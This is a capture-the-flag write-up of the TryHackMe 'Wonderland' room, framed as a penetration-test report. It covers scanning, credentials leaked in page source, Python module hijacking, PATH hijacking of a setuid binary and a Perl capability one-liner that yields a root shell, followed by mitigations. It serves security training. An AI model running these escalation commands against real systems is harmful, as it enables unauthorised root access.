# Vulnerability Assessment and Penetration Testing (VAPT) Report – Wonderland

**Prepared by:** Nishanth Antony  
**Date:** September 1, 2025  
**Difficulty:** Medium  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps  
**Objective:** Identify open ports and hidden directories on the target.  
**Commands Used:**  
- `nmap -p- --min-rate=1000 <target_ip> -sV -T4 -v`  
- `gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt`  
- `gobuster dir -u http://<target_ip>/r/ -w /usr/share/wordlists/dirb/common.txt`  
- `gobuster dir -u http://<target_ip>/r/a/b/b/i/t/ -w /usr/share/wordlists/dirb/common.txt`  

**Findings:**  
- Open ports: SSH (22, OpenSSH 7.6p1) and HTTP (80, Golang net/http server).  
- Initial Gobuster revealed `/img`, `/index.html`, and `/r` directories.  
- Further enumeration on `/r/a/b/b/i/t/` confirmed `/index.html`.  
- Downloaded `alice_door.jpg` from `/img/`, but initial steganography attempts failed.  

---

## 2. Exploitation Process  
**Step 1 – Web Enumeration and Credential Discovery**  
- Performed directory enumeration with Gobuster, identifying `/r/a/b/b/i/t/` as a potential entry point.  
- Inspected the `/r/a/b/b/i/t/index.html` page source code, revealing credentials: username `alice` and password `Wonderland2020`.  
- Attempted SSH login with these credentials:  
  ```bash
  ssh alice@<target_ip>
  alice@<target_ip> password: 
  Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
  ...
  Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
  alice@wonderland:~$ ls
  root.txt  walrus_and_the_carpenter.py
  ```
- Outcome: Successfully logged in as `alice`, but `root.txt` access was denied.  

**Step 2 – Privilege Escalation Preparation**  
- Checked sudo privileges:  
  ```bash
  sudo -l
  User alice may run the following commands on wonderland:
      (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
  ```
- Attempted to inject code by creating `random.py`:  
  ```bash
  echo "import subprocess;subprocess.call('/bin/sh');" > random.py
  sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
  whoami
  rabbit
  ```
- Initial execution failed due to script errors, but provided a temporary shell as `rabbit`.  

**Step 3 – Advanced Privilege Escalation**  
- Explored `/home/rabbit/teaParty`, a setuid binary owned by root:  
  ```bash
  ls -lah
  -rwsr-sr-x 1 root root 17K May 25 2020 teaParty
  ```
- Modified `PATH` to exploit `teaParty`:  
  ```bash
  export PATH=/home/rabbit:$PATH
  echo "/bin/bash" > date
  chmod +x ./date
  ./teaParty
  Welcome to the tea party!
  The Mad Hatter will be here soon.
  Probably by hatter@wonderland:/home/rabbit$
  ```
- Gained shell as `hatter` due to `teaParty` executing the custom `date` script with elevated privileges.  

**Step 4 – Post-Exploitation and Root Access**  
- Found `password.txt` in `/home/hatter/`:  
  ```bash
  cat password.txt
  WhyIsARavenLikeAWritingDesk?
  ```
- Attempted `su hatter` with the password, but `/root` access was denied.  
- Discovered capabilities on `/usr/bin/perl5.26.1`:  
  ```bash
  getcap -r / 2>/dev/null
  /usr/bin/perl5.26.1 = cap_setuid+ep
  ```
- Executed privilege escalation:  
  ```bash
  /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
  # whoami
  root
  # cat /home/alice/root.txt
  thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
  ```
- Outcome: Root flag retrieved.  

---

## 3. Proof of Concept (PoC)  
- **SSH Access:**  
  `ssh alice@<target_ip>` with `Wonderland2020` from `/r/a/b/b/i/t/index.html`.  
- **Privilege Escalation:**  
  `export PATH=/home/rabbit:$PATH; echo "/bin/bash" > date; chmod +x ./date; ./teaParty` to gain `hatter` shell.  
  `/usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` to escalate to root.  

---

## 4. Privilege Escalation and Post-Exploitation  
**Post-SSH Access as Alice:**  
After gaining SSH access as `alice`, initial exploration revealed `root.txt` and `walrus_and_the_carpenter.py`. The `root.txt` file was inaccessible due to permissions, indicating a need for privilege escalation. The `sudo -l` command disclosed that `alice` could execute `/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` as user `rabbit`. This suggested a potential code injection vulnerability. Creating `random.py` with a shell command (`import subprocess;subprocess.call('/bin/sh');`) and running it via sudo provided a brief `rabbit` shell, but the script crashed due to an `AttributeError` in the original Python file, limiting further immediate exploitation.

**Privilege Escalation Details:**  
- The `teaParty` binary in `/home/rabbit/` had the setuid bit set (`-rwsr-sr-x`), allowing it to run with root privileges. Its functionality included executing a `date` command, which could be hijacked by modifying the `PATH` environment variable. By placing a custom `date` script (`/bin/bash`) in `/home/rabbit/` and adjusting `PATH`, `teaParty` executed this script, escalating privileges to `hatter`.  
- Further exploration as `hatter` revealed `password.txt` with a password, but `su hatter` didn’t grant `/root` access. Using `getcap`, capabilities on `/usr/bin/perl5.26.1` (`cap_setuid+ep`) were identified, enabling a Perl one-liner to set the UID to 0 and spawn a root shell. This method leveraged the capability to bypass traditional privilege checks, granting full root access to retrieve the flag from `/home/alice/root.txt`.

---

## 5. Mitigation Recommendations  
- **Web Server Hardening:**  
  - Restrict access to sensitive directories (e.g., `/r/a/b/b/i/t/`).  
- **SSH Security:**  
  - Avoid exposing credentials in web page source code; enforce strong passwords.  
- **Privilege Management:**  
  - Remove setuid bits from unnecessary binaries (e.g., `teaParty`).  
  - Restrict sudo commands to specific, non-executable arguments.  
- **Capability Control:**  
  - Limit capabilities (e.g., `cap_setuid`) to trusted binaries only.  
- **Patch Management:**  
  - Update OpenSSH and Golang services to latest versions.  
  - Monitor for unauthorized file modifications.  

---

## 6. Lessons Learned  
- **Credential Exposure:** Web source code can leak sensitive credentials.  
- **Setuid Exploitation:** Misconfigured setuid binaries are prime escalation targets.  
- **Capability Abuse:** Capabilities like `cap_setuid` can be exploited if improperly assigned.  

---

## 7. Skills Practiced  
- Network scanning (nmap)  
- Web directory enumeration (gobuster)  
- SSH access via web-discovered credentials  
- Privilege escalation (setuid, capabilities)  
